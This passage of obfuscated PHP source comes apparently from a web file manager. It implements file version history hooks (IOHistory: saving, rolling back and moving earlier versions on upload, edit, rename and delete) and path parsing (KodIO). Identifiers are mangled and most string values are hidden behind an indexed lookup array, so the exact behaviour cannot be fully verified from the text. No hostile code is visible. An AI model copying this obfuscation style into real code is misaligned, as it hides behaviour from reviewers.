!empty($¹Ãç•ñÕ[1]) ? $¹Ãç•ñÕ[1] : $Û…¡Ñµ; } } if ($ôòÑ½·ç && I18n::getType() == $„ÎÒÑ¸‡[1501]) { if ($áõé‚¸® == 1) { $Û…¡Ñµ = str_replace($„ÎÒÑ¸‡[1502], $„ÎÒÑ¸‡[1503], $Û…¡Ñµ); } else { if ($áõé‚¸® == 2) { $¹Ãç•ñÕ = explode($„ÎÒÑ¸‡[214], $¹Ãç•ñÕ[0]); $İªšôõú = isset($¹Ãç•ñÕ[1]) ? $¹Ãç•ñÕ[1] : $„ÎÒÑ¸‡[12]; $ãíñ‹Ş = array($„ÎÒÑ¸‡[1504] => $„ÎÒÑ¸‡[1505], $„ÎÒÑ¸‡[1506] => $„ÎÒÑ¸‡[1507], $„ÎÒÑ¸‡[1508] => $„ÎÒÑ¸‡[1509], $„ÎÒÑ¸‡[1510] => $„ÎÒÑ¸‡[1511], $„ÎÒÑ¸‡[1512] => $„ÎÒÑ¸‡[1513], $„ÎÒÑ¸‡[1514] => $„ÎÒÑ¸‡[1515], $„ÎÒÑ¸‡[1516] => $„ÎÒÑ¸‡[1517], $„ÎÒÑ¸‡[1518] => $„ÎÒÑ¸‡[1519], $„ÎÒÑ¸‡[1520] => $„ÎÒÑ¸‡[1521], $„ÎÒÑ¸‡[1522] => $„ÎÒÑ¸‡[1523]); if (isset($ãíñ‹Ş[$İªšôõú])) { $Û…¡Ñµ = $ãíñ‹Ş[$İªšôõú]; } } } if (stripos($Û…¡Ñµ, $„ÎÒÑ¸‡[1524])) { $Û…¡Ñµ = $„ÎÒÑ¸‡[1525]; } } if (!trim($Û…¡Ñµ)) { return; } parent::writeLog(trim($Û…¡Ñµ), $²½ŒØå); } } goto c†Ä«æ ±; BŸºË‘À³: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¡É§‰ïå =& $_SERVER[÷åé¼î]; $úÙ¹×á = $GLOBALS[$¡É§‰ïå[6]][$¡É§‰ïå[92]]; if ($úÙ¹×á[$¡É§‰ïå[1295]] != 1) { return; } if ($úÙ¹×á[$¡É§‰ïå[1296]] <= 0) { return; } if (isset($_REQUEST[$¡É§‰ïå[1297]]) && $_REQUEST[$¡É§‰ïå[1297]] == $¡É§‰ïå[91]) { return; } Hook::bind($¡É§‰ïå[1298], $¡É§‰ïå[1299]); Hook::bind($¡É§‰ïå[1300], $¡É§‰ïå[1301]); Hook::bind($¡É§‰ïå[1302], $¡É§‰ïå[1303]); Hook::bind($¡É§‰ïå[1304], $¡É§‰ïå[1305]); Hook::bind($¡É§‰ïå[1306], $¡É§‰ïå[1307]); Hook::bind($¡É§‰ïå[1308], $¡É§‰ïå[1309]); } public static function eventBeforeUpload($–¨Ûîş÷) { if ($–¨Ûîş÷[3] && $–¨Ûîş÷[3] != REPEAT_REPLACE) { return; } $“áÆ˜” = self::parsePath($–¨Ûîş÷[0]); if (!$“áÆ˜”) { return; } self::add($“áÆ˜”); } public static function eventBeforeEdit($Ø‰ø¦Ù‡) { $»öÌ¼€– = self::parsePath($Ø‰ø¦Ù‡[0]); if (!$»öÌ¼€–) { return; } self::add($»öÌ¼€–); } public static function eventBeforeCopyFile($È­Ï‚Ãø, $–° ÓÀú, $¸¨å‚Ë, $éğ¼‹çê, $¡³€ïîÙ, $êŒ½ÂåÚ) { $€ĞÓœğø =& $_SERVER[÷åé¼î]; if (isset($¸¨å‚Ë->_data[$€ĞÓœğø[1230]]) && $¸¨å‚Ë->_data[$€ĞÓœğø[1230]]) { return; } $À¼Í†¦¢ = $¸¨å‚Ë->getPathOuter($éğ¼‹çê); $×•Á Ô® = self::parsePath($À¼Í†¦¢); if (!$×•Á Ô®) { return; } self::add($×•Á Ô®); } public static function eventBeforeRename($²ÑáÑıË) { $½ÕÀô¤” =& $_SERVER[÷åé¼î]; $´ƒÖ´±– = self::parsePath($²ÑáÑıË[0]); if (!$´ƒÖ´±–) { return; } $ÂùòâŞ¨ = self::checkInHistory($´ƒÖ´±–); if (!$ÂùòâŞ¨) { return; } if ($ÂùòâŞ¨[$½ÕÀô¤”[33]] == $½ÕÀô¤”[230]) { $‰éˆò·ª = self::listData($´ƒÖ´±–); if ($‰éˆò·ª && $‰éˆò·ª[$½ÕÀô¤”[429]]) { self::moveHistory($´ƒÖ´±–, $²ÑáÑıË[1]); } } else { IO::rename($ÂùòâŞ¨[$½ÕÀô¤”[87]], $²ÑáÑıË[1]); } } public static function eventBeforeMove($æ°©÷“) { $ª±š¨Ğ« =& $_SERVER[÷åé¼î]; $š„Š¬¿­ = self::parsePath($æ°©÷“[0]); if (!$š„Š¬¿­) { return; } $÷†ÂáìË = self::parsePath($æ°©÷“[1]); if (!$÷†ÂáìË) { return; } $ˆ§ÑÆß = $æ°©÷“[3]; $æäè¨Îï = self::checkInHistory($š„Š¬¿­); if (!$æäè¨Îï) { return; } $ÙèØş¢“ = self::pathHistory($÷†ÂáìË); if ($æäè¨Îï[$ª±š¨Ğ«[33]] == $ª±š¨Ğ«[230]) { $şÇ¤³ã– = self::listData($š„Š¬¿­); $’áÒÉšâ = rtrim($÷†ÂáìË, $ª±š¨Ğ«[8]) . $ª±š¨Ğ«[8] . ($ˆ§ÑÆß ? $ˆ§ÑÆß : get_path_this($š„Š¬¿­)); $®µ€ïë÷ = self::listData($’áÒÉšâ); if ($şÇ¤³ã– && $şÇ¤³ã–[$ª±š¨Ğ«[429]] && $®µ€ïë÷ && $®µ€ïë÷[$ª±š¨Ğ«[429]]) { return self::clear($š„Š¬¿­); } if ($şÇ¤³ã– && $şÇ¤³ã–[$ª±š¨Ğ«[429]]) { self::moveHistory($š„Š¬¿­, $ˆ§ÑÆß, $ÙèØş¢“); } } else { IO::move($æäè¨Îï[$ª±š¨Ğ«[87]], $ÙèØş¢“, !1, $ˆ§ÑÆß); self::clearEmptyFolder(IO::pathFather($æäè¨Îï[$ª±š¨Ğ«[87]])); } } public static function eventAfterRemove($‹ÁÏºÄ¹, $¥×ê³¯ƒ) { $«Á¸³ûº =& $_SERVER[÷åé¼î]; if (!$¥×ê³¯ƒ) { return; } $ªŒ¤¨à = self::parsePath($‹ÁÏºÄ¹[0]); if (!$ªŒ¤¨à) { return; } $ÃôÂ†À˜ = self::checkInHistory($ªŒ¤¨à); if (!$ÃôÂ†À˜) { return; } if ($ÃôÂ†À˜[$«Á¸³ûº[33]] == $«Á¸³ûº[230]) { $îœôÊõÕ = self::listData($ªŒ¤¨à, !1); if ($îœôÊõÕ && $îœôÊõÕ[$«Á¸³ûº[429]]) { self::clear($ªŒ¤¨à, !1); } } else { IO::remove($ÃôÂ†À˜[$«Á¸³ûº[87]]); self::clearEmptyFolder(IO::pathFather($ÃôÂ†À˜[$«Á¸³ûº[87]])); } } private static function checkInHistory($ùÒÙÊà…) { $¡¨Œõöõ = self::pathHistory($ùÒÙÊà…); if (!IO::exist($¡¨Œõöõ)) { $¡¨Œõöõ .= $_SERVER[÷åé¼î][1310]; } return IO::exist($¡¨Œõöõ) ? IO::info($¡¨Œõöõ) : !1; } private static function parsePath($¯¬¥ˆ‹•) { $ìÏšÒ‚ù =& $_SERVER[÷åé¼î]; if (!$¯¬¥ˆ‹•) { return !1; } if (isset($GLOBALS[$ìÏšÒ‚ù[1311]]) && $GLOBALS[$ìÏšÒ‚ù[1311]]) { return; } $Âã¤†ŠÖ = KodIO::parse($¯¬¥ˆ‹•); $ÀùÄÈÓ = $Âã¤†ŠÖ[$ìÏšÒ‚ù[33]]; $£Äû™‚ñ = !$ÀùÄÈÓ || $ÀùÄÈÓ == KodIO::KOD_IO || $ÀùÄÈÓ == KodIO::KOD_SHARE_ITEM; if (!$£Äû™‚ñ || !$Âã¤†ŠÖ[$ìÏšÒ‚ù[1312]]) { return !1; } if (substr($¯¬¥ˆ‹•, 0, strlen(DATA_PATH . $ìÏšÒ‚ù[1313])) == DATA_PATH . $ìÏšÒ‚ù[1313]) { return !1; } if ($ÀùÄÈÓ == KodIO::KOD_SHARE_ITEM) { $àî°½í´ = IO::init($¯¬¥ˆ‹•); if ($àî°½í´->pathParse[$ìÏšÒ‚ù[1226]]) { return self::parsePath($àî°½í´->pathParse[$ìÏšÒ‚ù[1226]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ííİˆæÏ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ìÏšÒ‚ù[1314]); foreach ($ííİˆæÏ as $¬¿‹¿¨ï) { if (!$ÀùÄÈÓ && substr($¯¬¥ˆ‹•, 0, strlen($¬¿‹¿¨ï)) == $¬¿‹¿¨ï) { return !1; } } self::log($GLOBALS[$ìÏšÒ‚ù[1221]] . $ìÏšÒ‚ù[1315] . $¯¬¥ˆ‹•); return $¯¬¥ˆ‹•; } private static function pathHistory($Ò„ì’Ï¼) { $”âô˜ =& $_SERVER[÷åé¼î]; $“â«şÌÅ = self::$_historyBase . ltrim(KodIO::clear($Ò„ì’Ï¼), $”âô˜[8]); $“â«şÌÅ = str_replace(array($”âô˜[1316]), array($”âô˜[1317]), $“â«şÌÅ); return $“â«şÌÅ; } public static function log($Ä‘áİãÕ) { } public static function historyCount($…”§¨ÌÍ) { $ÌŞ¿ŸŒµ =& $_SERVER[÷åé¼î]; $ÖÉø²  = array(); $©ŠÏÛ = array(); foreach ($…”§¨ÌÍ as $¯Ç³ôÕ) { $ª¥ÍÛÎÛ = get_path_father($¯Ç³ôÕ); if (!$©ŠÏÛ[$ª¥ÍÛÎÛ]) { $©ŠÏÛ[$ª¥ÍÛÎÛ] = array(); } $©ŠÏÛ[$ª¥ÍÛÎÛ][] = get_path_this($¯Ç³ôÕ); } foreach ($©ŠÏÛ as $ª¥ÍÛÎÛ => $ù½ÍŸ·â) { $¸áïş¦Ë = self::parsePath($ª¥ÍÛÎÛ); if (!$¸áïş¦Ë) { continue; } foreach ($ù½ÍŸ·â as $çüç’íê) { $ğğÁ©˜Ÿ = self::listData(rtrim($¸áïş¦Ë, $ÌŞ¿ŸŒµ[8]) . $ÌŞ¿ŸŒµ[8] . $çüç’íê, !1); if ($ğğÁ©˜Ÿ && $ğğÁ©˜Ÿ[$ÌŞ¿ŸŒµ[429]]) { $ÖÉø² [rtrim($ª¥ÍÛÎÛ, $ÌŞ¿ŸŒµ[8]) . $ÌŞ¿ŸŒµ[8] . $çüç’íê] = count($ğğÁ©˜Ÿ[$ÌŞ¿ŸŒµ[429]]); } } } return $ÖÉø² ; } public static function add($¶„ÊÙŸ) { $—ÓÜôñƒ =& $_SERVER[÷åé¼î]; $‹ê¸ô¬Î = self::listData($¶„ÊÙŸ); if (!$‹ê¸ô¬Î) { return; } $øöœä£‘ = Model($—ÓÜôñƒ[835])->get($—ÓÜôñƒ[1318]); $ÈĞÁ×î‹ = intval($GLOBALS[$—ÓÜôñƒ[6]][$—ÓÜôñƒ[92]][$—ÓÜôñƒ[1296]]); $¸€‰Ñ®™ = $øöœä£‘ == $—ÓÜôñƒ[1319] ? min(5, $ÈĞÁ×î‹) : $ÈĞÁ×î‹; if ($ÈĞÁ×î‹ <= 0) { return; } $èœä’í© = IO::info($¶„ÊÙŸ); $ğÁ×ø¯ë = $‹ê¸ô¬Î[$—ÓÜôñƒ[429]]; if ($èœä’í©[$—ÓÜôñƒ[79]] == 0) { return; } if ($èœä’í©[$—ÓÜôñƒ[79]] >= 1024 * 1024 * 500) { return !1; } $à“¾Ù® = IO::hashSimple($¶„ÊÙŸ); if ($ğÁ×ø¯ë && $ğÁ×ø¯ë[0][$—ÓÜôñƒ[656]] == $à“¾Ù®) { return !0; } if (array_key_exists($—ÓÜôñƒ[233], $èœä’í©) && !$èœä’í©[$—ÓÜôñƒ[233]]) { return !1; } $­²ïÃ‘ = short_id(time()); $™ÚÔ·§— = array($—ÓÜôñƒ[459] => $­²ïÃ‘, $—ÓÜôñƒ[656] => $à“¾Ù®, $—ÓÜôñƒ[32] => $èœä’í©[$—ÓÜôñƒ[32]] . $—ÓÜôñƒ[10] . date($—ÓÜôñƒ[1320]) . rand_string(1), $—ÓÜôñƒ[79] => $èœä’í©[$—ÓÜôñƒ[79]], $—ÓÜôñƒ[511] => USER_ID, $—ÓÜôñƒ[231] => time(), $—ÓÜôñƒ[1321] => $—ÓÜôñƒ[12]); IO::mkdir($‹ê¸ô¬Î[$—ÓÜôñƒ[1322]]); $¼ÍÁÚî  = IO::copy($¶„ÊÙŸ, $‹ê¸ô¬Î[$—ÓÜôñƒ[1322]], !1, $™ÚÔ·§—[$—ÓÜôñƒ[32]]); if (!$¼ÍÁÚî ) { self::clearEmptyFolder($‹ê¸ô¬Î[$—ÓÜôñƒ[1322]]); return !1; } array_unshift($ğÁ×ø¯ë, $™ÚÔ·§—); if (count($ğÁ×ø¯ë) > $¸€‰Ñ®™) { $’ö£‡¶¸ = array_slice($ğÁ×ø¯ë, $¸€‰Ñ®™); foreach ($’ö£‡¶¸ as $–ğí±±œ) { IO::remove($‹ê¸ô¬Î[$—ÓÜôñƒ[1322]] . $–ğí±±œ[$—ÓÜôñƒ[32]]); } $ğÁ×ø¯ë = array_slice($ğÁ×ø¯ë, 0, $¸€‰Ñ®™); } return self::saveData($‹ê¸ô¬Î[$—ÓÜôñƒ[1323]], $ğÁ×ø¯ë); } public static function remove($«Ş·İàë, $Áôö««É) { $Êâ ›„Ä =& $_SERVER[÷åé¼î]; $óŞŒè÷• = self::listData($«Ş·İàë); $¿ ë¶æÄ = array(); if (!$óŞŒè÷•) { return !1; } foreach ($óŞŒè÷•[$Êâ ›„Ä[429]] as $…ïúƒĞ¿) { if ($…ïúƒĞ¿[$Êâ ›„Ä[459]] == $Áôö««É) { IO::remove($óŞŒè÷•[$Êâ ›„Ä[1322]] . $…ïúƒĞ¿[$Êâ ›„Ä[32]]); continue; } $¿ ë¶æÄ[] = $…ïúƒĞ¿; } return self::saveData($óŞŒè÷•[$Êâ ›„Ä[1323]], $¿ ë¶æÄ); } public static function clear($é‡Í ŞÎ, $œñÎª¬¾ = true) { $®“ª” =& $_SERVER[÷åé¼î]; $¡Ÿ”‹ö = self::listData($é‡Í ŞÎ, $œñÎª¬¾); if (!$¡Ÿ”‹ö) { return !1; } foreach ($¡Ÿ”‹ö[$®“ª”[429]] as $³âØ¸¿˜) { IO::remove($¡Ÿ”‹ö[$®“ª”[1322]] . $³âØ¸¿˜[$®“ª”[32]]); } return self::saveData($¡Ÿ”‹ö[$®“ª”[1323]], array()); } public static function moveHistory($èÂÖÉ ¶, $¶‘‰€«¯ = '', $±¿çñÓ = '') { $Ğ…åÄ°û =& $_SERVER[÷åé¼î]; $™ËÄ¿ = self::listData($èÂÖÉ ¶, !1); if (!$™ËÄ¿ || !$™ËÄ¿[$Ğ…åÄ°û[429]]) { return !1; } $¯Âöú÷ = $Ğ…åÄ°û[1310]; $¶‘‰€«¯ = $¶‘‰€«¯ ? $¶‘‰€«¯ : get_path_this($èÂÖÉ ¶); $±¿çñÓ = $±¿çñÓ ? $±¿çñÓ : $™ËÄ¿[$Ğ…åÄ°û[1322]]; $„ßˆ°¡• = substr(get_path_this($™ËÄ¿[$Ğ…åÄ°û[1323]]), 0, -strlen($¯Âöú÷)); foreach ($™ËÄ¿[$Ğ…åÄ°û[429]] as $”ØÖ©¹ => $‰ĞùÌ«Ô) { $šã¥°ıû = $¶‘‰€«¯ . substr($‰ĞùÌ«Ô[$Ğ…åÄ°û[32]], strlen($„ßˆ°¡•)); $‘–”Ú¯ë = IO::move($™ËÄ¿[$Ğ…åÄ°û[1322]] . $‰ĞùÌ«Ô[$Ğ…åÄ°û[32]], $±¿çñÓ, !1, $šã¥°ıû); if ($‘–”Ú¯ë) { $™ËÄ¿[$Ğ…åÄ°û[429]][$”ØÖ©¹][$Ğ…åÄ°û[32]] = $šã¥°ıû; } } $™ËÄ¿[$Ğ…åÄ°û[1323]] = IO::move($™ËÄ¿[$Ğ…åÄ°û[1323]], $±¿çñÓ, !1, $¶‘‰€«¯ . $¯Âöú÷); self::saveData($™ËÄ¿[$Ğ…åÄ°û[1323]], $™ËÄ¿[$Ğ…åÄ°û[429]]); self::clearEmptyFolder($™ËÄ¿[$Ğ…åÄ°û[1322]]); } public static function rollback($ª²åÏŸó, $²Ñ®Ÿ²Ü) { $ÊûÕØğ =& $_SERVER[÷åé¼î]; $òïœ™¤Å = self::listData($ª²åÏŸó); if (!$òïœ™¤Å) { return; } $Ù©Ñ›×ö = IO::info($ª²åÏŸó); foreach ($òïœ™¤Å[$ÊûÕØğ[429]] as $³ï®Í¸® => $Ê†‹€­) { if ($Ê†‹€­[$ÊûÕØğ[459]] == $²Ñ®Ÿ²Ü) { self::add($ª²åÏŸó); $âõ„€ı = $òïœ™¤Å[$ÊûÕØğ[1322]] . $Ê†‹€­[$ÊûÕØğ[32]]; $î›âÓ­æ = IO::copy($âõ„€ı, IO::pathFather($ª²åÏŸó), REPEAT_REPLACE, $Ù©Ñ›×ö[$ÊûÕØğ[32]]); if ($î›âÓ­æ) { self::remove($ª²åÏŸó, $²Ñ®Ÿ²Ü); } return $î›âÓ­æ; } } return !1; } public static function setDetail($’ ì¸Ïç, $½ËÉï„÷, $ª¡­€•) { $Äå¿•õĞ =& $_SERVER[÷åé¼î]; $ÔÃ…¿‚ = self::listData($’ ì¸Ïç); if (!$ÔÃ…¿‚) { return; } foreach ($ÔÃ…¿‚[$Äå¿•õĞ[429]] as $¨€ùş’ => $Ÿ–Ø¹…ğ) { if ($Ÿ–Ø¹…ğ[$Äå¿•õĞ[459]] == $½ËÉï„÷) { $ÔÃ…¿‚[$Äå¿•õĞ[429]][$¨€ùş’][$Äå¿•õĞ[1321]] = $ª¡­€•; self::saveData($ÔÃ…¿‚[$Äå¿•õĞ[1323]], $ÔÃ…¿‚[$Äå¿•õĞ[429]]); return !0; } } return !1; } public static function fileInfo($«ë‹“‹©, $±Ìú€â) { $ÆÃª¸ë =& $_SERVER[÷åé¼î]; $ƒ€Ó½í = self::listData($«ë‹“‹©); if (!$ƒ€Ó½í) { show_json(LNG($ÆÃª¸ë[108]), !1); } $Óç±óöŞ = $ÆÃª¸ë[12]; foreach ($ƒ€Ó½í[$ÆÃª¸ë[429]] as $Ü…ºÂÈ => $±ŸÔö €) { if ($±ŸÔö €[$ÆÃª¸ë[459]] != $±Ìú€â) { continue; } $Óç±óöŞ = $ƒ€Ó½í[$ÆÃª¸ë[1322]] . $±ŸÔö €[$ÆÃª¸ë[32]]; break; } if (!$Óç±óöŞ) { show_json(LNG($ÆÃª¸ë[108]), !1); } return IO::info($Óç±óöŞ); } public static function fileOut($ÆÖ²¯ÓÊ, $í¸Ä¡ö, $ìà™ø‘ = false) { $Ç€È°ù =& $_SERVER[÷åé¼î]; $çÂå³Õœ = self::fileInfo($ÆÖ²¯ÓÊ, $í¸Ä¡ö); $Ó†ĞÀ‹ =& $GLOBALS[$Ç€È°ù[7]]; $ìà™ø‘ = isset($Ó†ĞÀ‹[$Ç€È°ù[1273]]) && $Ó†ĞÀ‹[$Ç€È°ù[1273]] == 1; if (isset($Ó†ĞÀ‹[$Ç€È°ù[33]]) && $Ó†ĞÀ‹[$Ç€È°ù[33]] == $Ç€È°ù[1324]) { return IO::fileOutImage($çÂå³Õœ[$Ç€È°ù[87]], $Ó†ĞÀ‹[$Ç€È°ù[1325]]); } IO::fileOut($çÂå³Õœ[$Ç€È°ù[87]], $ìà™ø‘, get_path_this($ÆÖ²¯ÓÊ)); } public static function listData($ßİ¯÷, $ëˆ–Ã–¨ = true) { $Áà¤à•é =& $_SERVER[÷åé¼î]; if ($ëˆ–Ã–¨ && !IO::exist($ßİ¯÷)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ßİ¯÷, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ó³ƒ³¸ø = self::pathHistory($ßİ¯÷); $˜ÒĞš¶ò = array($Áà¤à•é[1323] => $ó³ƒ³¸ø . $Áà¤à•é[1310], $Áà¤à•é[1322] => rtrim(get_path_father($ó³ƒ³¸ø), $Áà¤à•é[8]) . $Áà¤à•é[8], $Áà¤à•é[429] => array()); $·æö¯ß = IO::getContent($˜ÒĞš¶ò[$Áà¤à•é[1323]]); if ($·æö¯ß) { $¡Œğá‹‹ = json_decode($·æö¯ß, !0); if (is_array($¡Œğá‹‹)) { $˜ÒĞš¶ò[$Áà¤à•é[429]] = $¡Œğá‹‹; } } return $˜ÒĞš¶ò; } private static function saveData($°áøŒÌ, $ù°ËøÂâ) { $„Ä…ï¡í =& $_SERVER[÷åé¼î]; self::log($„Ä…ï¡í[1326] . $°áøŒÌ . $„Ä…ï¡í[74] . count($ù°ËøÂâ), $„Ä…ï¡í[817]); if ($ù°ËøÂâ) { return IO::setContent($°áøŒÌ, json_encode($ù°ËøÂâ)); } $î¹Ò–ıÍ = IO::pathFather($°áøŒÌ); IO::remove($°áøŒÌ); self::clearEmptyFolder($î¹Ò–ıÍ); return !0; } public static function clearEmptyFolder($³Œƒö´) { $ŒÌúç— =& $_SERVER[÷åé¼î]; if (trim($³Œƒö´, $ŒÌúç—[8]) == trim(self::$_historyBase, $ŒÌúç—[8])) { return; } $ìß³óÕğ = IO::pathFather($³Œƒö´); $§õı€ë = IO::has($³Œƒö´, !0); if ($§õı€ë[$ŒÌúç—[239]] > 0 || $§õı€ë[$ŒÌúç—[240]] > 0) { return; } IO::remove($³Œƒö´); self::clearEmptyFolder($ìß³óÕğ); } private static function getBasePath() { $ø€ ª›± =& $_SERVER[÷åé¼î]; $Ü©ñ®Çî = Model($ø€ ª›±[1327])->get($ø€ ª›±[1328]); if ($Ü©ñ®Çî) { if (!IO::exist($Ü©ñ®Çî)) { IO::mkdir($Ü©ñ®Çî); } if (get_path_this($Ü©ñ®Çî) == $ø€ ª›±[1313]) { $ê»÷Ÿú = $ø€ ª›±[1329] . rand_string(8); @rename($Ü©ñ®Çî, get_path_father($Ü©ñ®Çî) . $ø€ ª›±[8] . $ê»÷Ÿú); $Ü©ñ®Çî = DATA_PATH . $ê»÷Ÿú . $ø€ ª›±[8]; file_put_contents(DATA_PATH . $ø€ ª›±[1260], $ø€ ª›±[12]); Model($ø€ ª›±[1327])->set($ø€ ª›±[1328], $Ü©ñ®Çî); } return $Ü©ñ®Çî; } $Ü©ñ®Çî = DATA_PATH . $ø€ ª›±[1329] . rand_string(8) . $ø€ ª›±[8]; $Ü©ñ®Çî = IO::mkdir($Ü©ñ®Çî); $Ü©ñ®Çî = rtrim($Ü©ñ®Çî, $ø€ ª›±[8]) . $ø€ ª›±[8]; file_put_contents($Ü©ñ®Çî . $ø€ ª›±[1260], $ø€ ª›±[12]); file_put_contents(DATA_PATH . $ø€ ª›±[1260], $ø€ ª›±[12]); Model($ø€ ª›±[1327])->set($ø€ ª›±[1328], $Ü©ñ®Çî); return $Ü©ñ®Çî; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\162\122\145\143\171\x63\x6c\145\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\145\162\x46\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\x72\x46\x69\x6c\145\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\x72\x46\x69\x6c\x65\124\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\x75\160\122\157\x6f\x74\123\145\x6c\146\175"; const KOD_USER_SHARE = "\173\165\163\x65\x72\123\x68\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\162\x53\150\x61\x72\145\x4c\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\x61\162\x65\x54\x6f\115\145\175"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\145\111\164\145\155\175"; const KOD_SHARE_LINK = "\173\163\150\x61\x72\145\x49\164\x65\x6d\x4c\151\x6e\153\x7d"; const KOD_SEARCH = "\173\163\145\x61\x72\x63\x68\x7d"; const KOD_BLOCK = "\173\142\154\x6f\143\x6b\x7d"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\163\145\162\122\x65\156\x63\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\144\x72\x69\x76\x65\162\175"; public static function typeList() { $á¹× ñï =& $_SERVER[÷åé¼î]; return array($á¹× ñï[1330] => self::KOD_SOURCE, $á¹× ñï[1331] => self::KOD_USER_RECYCLE, $á¹× ñï[1332] => self::KOD_USER_FAV, $á¹× ñï[1333] => self::KOD_USER_FILE_TAG, $á¹× ñï[1334] => self::KOD_USER_FILE_TYPE, $á¹× ñï[1335] => self::KOD_GROUP_ROOT_SELF, $á¹× ñï[1336] => self::KOD_USER_SHARE, $á¹× ñï[1337] => self::KOD_USER_SHARE_LINK, $á¹× ñï[1338] => self::KOD_USER_SHARE_TO_ME, $á¹× ñï[1339] => self::KOD_SHARE_ITEM, $á¹× ñï[1340] => self::KOD_SHARE_LINK, $á¹× ñï[1341] => self::KOD_SEARCH, $á¹× ñï[1342] => self::KOD_BLOCK, $á¹× ñï[1343] => self::KOD_IO, $á¹× ñï[1344] => self::KOD_USER_RECENT, $á¹× ñï[1345] => self::KOD_USER_DRIVER); } public static function parse($Ò“µİì´) { $İåÂ—äË =& $_SERVER[÷åé¼î]; $Ò“µİì´ = self::clear($Ò“µİì´); $¶™ˆ¸Šı = array_values(self::typeList()); preg_match($İåÂ—äË[1346], $Ò“µİì´, $şïÏ‚À¬); $”äÈû§£ = array($İåÂ—äË[480] => !1, $İåÂ—äË[1347] => !1, $İåÂ—äË[477] => !1, $İåÂ—äË[87] => $Ò“µİì´, $İåÂ—äË[1245] => !1, $İåÂ—äË[1244] => $İåÂ—äË[12]); if (is_array($şïÏ‚À¬) && count($şïÏ‚À¬) == 5) { $ıöò¥Ä— = $İåÂ—äË[1348] . $şïÏ‚À¬[2] . $İåÂ—äË[387]; if (in_array($ıöò¥Ä—, $¶™ˆ¸Šı)) { $”äÈû§£[$İåÂ—äË[1245]] = $şïÏ‚À¬[1]; $”äÈû§£[$İåÂ—äË[33]] = $ıöò¥Ä—; $”äÈû§£[$İåÂ—äË[1349]] = substr($ıöò¥Ä—, 1, -1); $”äÈû§£[$İåÂ—äË[459]] = $şïÏ‚À¬[3]; } $”äÈû§£[$İåÂ—äË[1244]] = $şïÏ‚À¬[4]; } $†¿Ş«šÂ = array($İåÂ—äË[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $”äÈû§£[$İåÂ—äË[1312]] = in_array($”äÈû§£[$İåÂ—äË[33]], $†¿Ş«šÂ); return $”äÈû§£; } public static function isTruePath($Å¦¬€ÂÖ) { $¦¬ù¡ =& $_SERVER[÷åé¼î]; if (substr($Å¦¬€ÂÖ, 0, 1) != $¦¬ù¡[1348]) { return !0; } if (strpos($Å¦¬€ÂÖ, $¦¬ù¡[467]) === 0) { return !0; } if (strpos($Å¦¬€ÂÖ, $¦¬ù¡[1316]) === 0) { return !0; } if (strpos($Å¦¬€ÂÖ, $¦¬ù¡[1350]) === 0) { return !0; } if (strpos($Å¦¬€ÂÖ, $¦¬ù¡[1351]) === 0) { return !0; } if (strpos($Å¦¬€ÂÖ, $¦¬ù¡[1352]) === 0) { return !0; } return !1; } public static function clear($™‡—‰ÆŸ) { $à§…âÒ¾ =& $_SERVER[÷åé¼î]; $™‡—‰ÆŸ = str_replace(array($à§…âÒ¾[1151], $à§…âÒ¾[262]), $à§…âÒ¾[53], $™‡—‰ÆŸ); $™‡—‰ÆŸ = str_replace($à§…âÒ¾[100], $à§…âÒ¾[8], $™‡—‰ÆŸ); $œò‹»•î = $à§…âÒ¾[1353]; if (substr($™‡—‰ÆŸ, 0, 3) == $à§…âÒ¾[1354]) { $™‡—‰ÆŸ = substr($™‡—‰ÆŸ, 3); } while (strstr($™‡—‰ÆŸ, $œò‹»•î)) { $™‡—‰ÆŸ = str_replace($œò‹»•î, $à§…âÒ¾[8], $™‡—‰ÆŸ); } $™‡—‰ÆŸ = preg_replace($à§…âÒ¾[1355], $à§…âÒ¾[8], $™‡—‰ÆŸ); if ($™‡—‰ÆŸ == $à§…âÒ¾[8]) { return $à§…âÒ¾[8]; } $™‡—‰ÆŸ = rtrim($™‡—‰ÆŸ, $à§…âÒ¾[8]); return $™‡—‰ÆŸ; } public static function pathTrue($“¤³¨Ÿª) { $á®¹íèñ =& $_SERVER[÷åé¼î]; if (!$“¤³¨Ÿª) { return $á®¹íèñ[12]; } $“¤³¨Ÿª = str_replace($á®¹íèñ[576], $á®¹íèñ[8], str_replace($á®¹íèñ[1356], $á®¹íèñ[8], $“¤³¨Ÿª)); $“¤³¨Ÿª = str_replace($á®¹íèñ[576], $á®¹íèñ[8], str_replace($á®¹íèñ[1356], $á®¹íèñ[8], $“¤³¨Ÿª)); if (!strstr($“¤³¨Ÿª, $á®¹íèñ[1354])) { return $“¤³¨Ÿª; } $à‰–÷ç = explode($á®¹íèñ[8], $“¤³¨Ÿª); foreach ($à‰–÷ç as $Œ¶€œ§ => $•ˆŞÅ±å) { if ($•ˆŞÅ±å !== $á®¹íèñ[1357]) { continue; } for ($¤ÜÕşÈ† = $Œ¶€œ§; $¤ÜÕşÈ† >= 0; $¤ÜÕşÈ†--) { if ($à‰–÷ç[$¤ÜÕşÈ†] === $á®¹íèñ[10] || $à‰–÷ç[$¤ÜÕşÈ†] === $á®¹íèñ[1357] || $à‰–÷ç[$¤ÜÕşÈ†] === -1) { continue; } if ($à‰–÷ç[$¤ÜÕşÈ†] === $á®¹íèñ[12]) { 